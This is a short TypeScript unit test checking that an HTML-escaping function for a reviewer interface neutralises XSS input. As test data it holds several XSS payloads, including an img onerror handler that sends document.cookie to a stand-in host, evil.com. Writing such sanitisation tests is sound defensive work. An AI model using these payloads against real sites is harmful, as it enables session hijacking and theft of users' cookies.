import { describe, it, expect } from "vitest";

function escapeHtml(str: string): string {
  if (!str) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

describe("Reviewer UI XSS Sanitization", () => {
  it("escapes malicious customer input including script tags, event handlers, and quotes", () => {
    const maliciousScript = "<script>alert('pwned')</script>";
    const maliciousImg = '<img src=x onerror="fetch(\x27http://evil.com/steal?\x27+document.cookie)">';
    const quoteInjection = '"><svg onload=alert(1)>';

    expect(escapeHtml(maliciousScript)).toBe("&lt;script&gt;alert(&#39;pwned&#39;)&lt;/script&gt;");
    expect(escapeHtml(maliciousImg)).not.toContain("<img");
    expect(escapeHtml(maliciousImg)).toContain("&lt;img");
    expect(escapeHtml(quoteInjection)).toBe("&quot;&gt;&lt;svg onload=alert(1)&gt;");
  });
});
